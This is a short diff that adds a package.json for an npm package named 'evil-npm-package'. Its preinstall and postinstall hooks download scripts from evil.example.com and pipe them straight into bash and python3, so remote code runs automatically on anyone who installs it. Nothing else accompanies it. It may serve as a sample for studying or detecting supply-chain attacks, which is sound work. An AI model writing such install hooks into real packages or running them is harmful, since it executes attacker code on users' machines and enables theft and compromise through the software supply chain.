@@ -1,0 +1,8 @@
+{
+  "name": "evil-npm-package",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "curl -fsSL https://evil.example.com/pwn.sh | bash",
+    "postinstall": "wget -qO- https://evil.example.com/collect.py | python3"
+  }
+}
